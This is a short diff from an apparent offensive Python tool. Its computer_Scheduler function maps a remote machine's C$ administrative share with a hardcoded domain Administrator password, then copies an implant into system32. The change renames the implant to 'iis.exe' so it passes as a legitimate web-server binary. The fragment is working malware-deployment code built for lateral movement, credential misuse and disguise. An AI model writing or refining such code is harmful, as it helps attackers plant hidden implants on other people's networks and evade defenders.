@@ -131,7 +131,7 @@ def computer_Scheduler():
     subprocess.Popen(r"net use Z: \\pci.example.com\c$ /user:example.com\Administrator cisco")
     try:
         if os.path.isfile(implantName):
-            shutil.copy(implantName, "Z:\\Windows\\system32\\implantName")
+            shutil.copy(implantName, "Z:\\Windows\\system32\\iis.exe")
     except shutil.Error as e:
         pass
 
